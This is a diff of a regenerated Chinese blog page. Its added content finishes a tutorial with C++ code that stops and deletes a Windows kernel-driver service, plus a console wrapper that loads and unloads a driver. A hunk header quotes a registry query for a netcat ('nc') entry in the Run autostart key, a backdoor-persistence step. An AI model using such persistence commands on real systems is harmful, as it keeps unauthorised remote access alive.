class="comment">//打开驱动所对应的服务</span></span><br><span class="line">	hServiceDDK = OpenService(hServiceMgr,szSvrName,SERVICE_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//打开驱动所对应的服务失败</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenService打开服务失败Faild:%d\n"</span>,GetLastError());</span><br><span class="line">		bRet = FALSE;</span><br><span class="line">		<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenService打开成功\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!ControlService(hServiceDDK,SERVICE_CONTROL_STOP,&amp;SvrSta))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ControlService faild :%d\n"</span>,GetLastError());</span><br><span class="line">		bRet = FALSE;</span><br><span class="line">		<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ControlService成功\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//动态卸载驱动</span></span><br><span class="line">	<span class="keyword">if</span> (!DeleteService(hServiceDDK))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"DeleteService faild:%d\n"</span>,GetLastError());</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"DeleteService 删除成功\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	bRet = TRUE;</span><br><span class="line">BeforeLeave:</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	<span class="keyword">if</span>(hServiceDDK)</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	<span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>卸载函数在打开服务之前是一样的，区别就是不打开服务了，直接进行控制服务，使用<code>SERVICE_CONTROL_STOP</code>停止服务，然后通过delete删除服务就完成了。</p>
+<p>主控制函数的话呢就是获取控制台参数就可以了：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt;<span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"需要两个参数，第一个是临时服务的名称，第二个是你的驱动路径！"</span>);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bRet = LoadNTDriver(argv[<span class="number">1</span>],argv[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">if</span>(!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"驱动加载失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"按任何键卸载驱动"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	bRet = UnLoadNTDriver(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"驱动卸载失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行的效果：<br><img src="img1.jpg" alt="sysmanger"></p>
+<h2 id="其他程序"><a href="#其他程序" class="headerlink" title="其他程序"></a>其他程序</h2><p>其实类似的程序有个叫做<code>KmdManager.exe</code>这个的程序其实就是比较好用的。</p>
 
       
     </div>
@@ -618,7 +286,7 @@ reg queryval -k HKLM\softwarel\microsoft\windows\\currentversion\\Run -V nc</cod
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/121/">121</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/122/">122</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -685,7 +353,7 @@ reg queryval -k HKLM\softwarel\microsoft\windows\\currentversion\\Run -V nc</cod
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">121</span>
+          <span class="site-state-item-count">122</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
